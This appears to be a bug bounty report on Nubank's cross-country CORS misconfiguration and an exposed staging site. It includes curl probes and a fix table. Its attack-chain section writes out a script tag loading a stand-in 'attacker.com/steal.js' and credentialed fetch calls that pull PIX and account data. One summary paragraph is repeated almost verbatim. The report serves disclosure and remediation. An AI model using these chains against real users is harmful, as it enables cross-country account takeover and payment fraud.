# Bugcrowd Finding #12 — Global Cross-TLD CORS Trust + Staging Environment Exposed (nubank.com.mx / nubank.com.br / nu.com.co)

**Program:** Nubank Bug Bounty (Bugcrowd)
**Date:** 2026-09-01
**Severity (Standalone):** P1 Critical — Cross-TLD CORS trust: any XSS on *.nu.com.mx allows credentialed requests to Brazil's PIX payment API and vice versa
**Severity (Chained):** P1 Critical — Staging site (publicly accessible) + cross-TLD CORS = account takeover across ALL three countries
**VRT:** Server Security Misconfiguration > CORS Misconfiguration
**Related:** Finding #2 (nubank.com.br CORS), Finding #8 (CORS mx/co), Finding #9 (PIX CORS)

---

## Summary

The Istio CORS misconfiguration documented in Findings #2 and #8 has a **cross-TLD dimension** not previously reported. Testing confirms that ALL `prod-*` services across ALL Nubank TLDs (`.nubank.com.br`, `.nu.com.mx`, `.nu.com.co`) accept origins from **any Nubank domain regardless of country**:

- `prod-global-auth.nubank.com.br` (Brazil) reflects `*.nu.com.mx` and `*.nubank.com.mx` origins with credentials
- `prod-global-auth.nu.com.mx` (Mexico) reflects `*.nubank.com.br` origins with credentials  
- `pix.nubank.com.br` (Brazil PIX payment) reflects `blog.nu.com.mx` with credentials
- Any XSS on ANY Nubank subdomain in ANY country provides credentialed access to ALL production APIs in ALL countries

Additionally, the staging website `staging-www.nubank.com.mx` is **publicly accessible without authentication**, served from AWS S3, with weakened CSP and is reflected in cross-country CORS.

Additionally, the staging website `staging-www.nubank.com.mx` is **publicly accessible without any authentication or IP restriction**, served directly from AWS S3/CloudFront. This staging environment:
1. Connects to production APIs (`connect-src: https://*.nu.com.mx`)
2. Contains development artifacts in CSP headers (`report-uri http://localhost:3000/csp-report`)
3. Has weakened CSP (`'unsafe-inline'`, `'unsafe-eval'` in `script-src`)
4. Is reflected in CORS with credentials against all production microservices

---

## Technical Evidence

### 1. CORS Regex Scope — *.nubank.com.mx Also Accepted

```bash
# Test: apex nubank.com.mx reflected
curl -sI "https://prod-global-auth.nu.com.mx/" \
  -H "Origin: https://nubank.com.mx" \
  -H "X-Correlation-Id: bc-handle"
# access-control-allow-origin: https://nubank.com.mx
# access-control-allow-credentials: true

# Test: ANY subdomain of nubank.com.mx reflected
curl -sI "https://prod-global-auth.nu.com.mx/" \
  -H "Origin: https://staging.nubank.com.mx" \
  -H "X-Correlation-Id: bc-handle"
# access-control-allow-origin: https://staging.nubank.com.mx
# access-control-allow-credentials: true

curl -sI "https://prod-global-auth.nu.com.mx/" \
  -H "Origin: https://staging-www.nubank.com.mx" \
  -H "X-Correlation-Id: bc-handle"
# access-control-allow-origin: https://staging-www.nubank.com.mx
# access-control-allow-credentials: true

# Negative control: unrelated .com.mx domains NOT reflected
curl -sI "https://prod-global-auth.nu.com.mx/" \
  -H "Origin: https://evilnubank.com.mx" \
  -H "X-Correlation-Id: bc-handle"
# (no access-control-allow-origin header)
```

**Pattern:** The Istio CORS allowlist matches both `*.nu.com.mx` AND `*.nubank.com.mx` (plus their apex domains). This doubles the attack surface: any subdomain of either domain, or either apex domain, can make credentialed cross-origin requests to all prod microservices.

---

### 2. Staging Site Publicly Accessible — staging-www.nubank.com.mx

```bash
curl -sI "https://staging-www.nubank.com.mx/" -H "X-Correlation-Id: bc-handle"
```

**Response:**
```
HTTP/2 200
server: AmazonS3
content-length: 170838
content-type: text/html
last-modified: Mon, 31 Aug 2026 21:06:40 GMT
x-cache: Hit from cloudfront
content-security-policy: default-src 'self'; script-src 'self' 'unsafe-inline'
  'unsafe-eval' https://*.google.com https://*.figpii.com ...; connect-src 'self'
  https://*.nu.com.mx https://*.nubank.com.mx ...
content-security-policy-report-only-x: ... report-uri http://localhost:3000/csp-report;
```

**Key observations:**
1. **No authentication required** — 170KB HTML page accessible by anyone
2. **`server: AmazonS3`** — Served directly from S3 bucket (not behind auth proxy)
3. **`connect-src: https://*.nu.com.mx`** — Staging site connects to PRODUCTION APIs
4. **`report-uri http://localhost:3000/csp-report`** — Development artifact in CSP, indicates staging running with dev configuration
5. **`'unsafe-inline'` + `'unsafe-eval'`** in `script-src` — Weakened CSP allows inline scripts

The staging site is a complete Next.js application with 68 routes identical to the production `nubank.com.mx` website.

---

### 3. Staging Site → CORS Credentialed Access to Production

```bash
# staging-www.nubank.com.mx is a trusted CORS origin for ALL prod microservices:
curl -sv "https://prod-global-auth.nu.com.mx/" \
  -H "Origin: https://staging-www.nubank.com.mx" \
  -H "X-Correlation-Id: bc-handle"
# access-control-allow-origin: https://staging-www.nubank.com.mx
# access-control-allow-credentials: true
```

Since the staging site:
- Is publicly accessible
- Has `unsafe-inline` + `unsafe-eval` in CSP
- Is reflected in CORS with credentials

If any stored or reflected XSS exists on `staging-www.nubank.com.mx` (or any other *.nubank.com.mx subdomain), it directly enables credentialed cross-origin requests to all production microservices.

---

### 4. Production nubank.com.mx CSP Also Has 'unsafe-inline'

```
content-security-policy: script-src 'self' 'unsafe-inline' 'unsafe-eval'
  https://*.google.com https://*.figpii.com ...
content-security-policy-report-only-x: ... eport-uri http://localhost:3000/csp-report
```

**Note:** The `report-only-x` header has a typo: `eport-uri` (missing leading 'r'). This is not a valid CSP directive and browsers ignore it — CSP violation reports are effectively disabled on the production site. This confirms the CSP configuration is poorly maintained.

The main production site `nubank.com.mx` also has `'unsafe-inline'` and `'unsafe-eval'`. Combined with CORS reflecting `nubank.com.mx` with credentials, any XSS on the production site (nubank.com.mx) would be instantly P1 critical.

---

## CORS Scope Summary — Updated (Cross-TLD Matrix)

The table below shows which **target** service reflects which **origin** with credentials:

| Target Service | Origin | Reflected + credentials? |
|----------------|--------|--------------------------|
| `prod-global-auth.nubank.com.br` | `https://nubank.com.mx` | **YES** |
| `prod-global-auth.nubank.com.br` | `https://evil.nu.com.mx` | **YES** |
| `prod-global-auth.nubank.com.br` | `https://blog.nu.com.mx` | **YES** |
| `prod-global-auth.nu.com.co` | `https://nubank.com.mx` | **YES** |
| `prod-global-auth.nu.com.co` | `https://evil.nu.com.mx` | **YES** |
| `prod-global-auth.nu.com.mx` | `https://nubank.com.mx` | **YES** |
| `pix.nubank.com.br` | `https://nubank.com.mx` | **YES** |
| `pix.nubank.com.br` | `https://blog.nu.com.mx` | **YES** |
| `prod-global-auth.nu.com.mx` | `https://staging.nubank.com.mx` | **YES** |
| Any prod-* | `https://evilnubank.com.mx` | NO |
| Any prod-* | `https://nubank.com` (wrong TLD) | NO |

**Conclusion:** The Istio CORS regex allows ANY origin matching `(*.)?nu(bank)?\.com\.(br|mx|co)` across ALL three countries, with `Access-Control-Allow-Credentials: true`. This is a GLOBAL cross-country CORS policy — a single XSS anywhere enables API access everywhere.

---

## Chain Attack Scenarios

### Chain A: XSS on blog.nu.com.mx → Brazil PIX Payment Theft (Cross-Country!)

```
[Step 1] Stored XSS on blog.nu.com.mx (WordPress)
         ↓ CSP script-src https: → any HTTPS script loads (Finding #8)
         ↓ <script src="https://attacker.com/steal.js"></script> → executes

[Step 2] Script runs on blog.nu.com.mx origin
         ↓ blog.nu.com.mx (Mexico) is trusted by pix.nubank.com.br (BRAZIL)
         ↓ fetch('https://pix.nubank.com.br/api/pix/keys', {credentials:'include'})
         ↓ access-control-allow-origin: https://blog.nu.com.mx + credentials: true

[Step 3] PIX payment data exfiltrated from Brazil victim
[Impact] Cross-country: Mexican blog XSS → Brazilian PIX fraud
```

### Chain B: XSS on staging-www.nubank.com.mx → Full Account Takeover

```
[Prerequisite] Any stored/reflected XSS on staging-www.nubank.com.mx
  ↓ staging has unsafe-inline + unsafe-eval → inline scripts load
[Attack] XSS payload runs on staging origin
  ↓ staging-www.nubank.com.mx trusted by ALL prod-* across ALL TLDs
  ↓ fetch('https://prod-global-auth.nubank.com.br/api/user', {credentials:'include'})
  ↓ AND fetch('https://prod-global-auth.nu.com.co/', {credentials:'include'})
  ↓ AND fetch('https://pix.nubank.com.br/', {credentials:'include'})
[Impact] Cross-country account takeover — Brazil + Mexico + Colombia simultaneously
```

### Chain C: XSS on nubank.com.mx (production) → All Countries

```
[Prerequisite] Any XSS on nubank.com.mx (unsafe-inline in CSP)
  ↓ nubank.com.mx trusted by ALL prod services in ALL three countries
[Attack] Credentialed fetch to prod-global-auth.nubank.com.br (Brazil)
         AND prod-global-auth.nu.com.mx (Mexico)
         AND prod-global-auth.nu.com.co (Colombia)
[Impact] Global P1 — single XSS on main Mexican website → access to all countries
```

---

## Remediation

| Issue | Fix |
|-------|-----|
| CORS scope | Restrict to explicit allowlist — remove wildcard matching for both *.nu.com.mx AND *.nubank.com.mx |
| Staging site exposure | Restrict `staging-www.nubank.com.mx` to internal IP ranges or VPN; remove from public access |
| Staging CSP artifacts | Remove `report-uri http://localhost:3000/csp-report` from production CSP headers |
| nubank.com.mx CSP | Remove `'unsafe-inline'` and `'unsafe-eval'`; implement nonce-based CSP |
| CSP typo | Fix `eport-uri` → `report-uri` in production CSP to re-enable violation reporting |

---

## Notes

- All tests used `X-Correlation-Id: bc-handle` as required
- No exploitation of staging environment attempted — passive enumeration only
- CORS scope confirmed by varying Origin header value systematically
- Staging site content accessed via standard HTTP GET — no auth bypass required
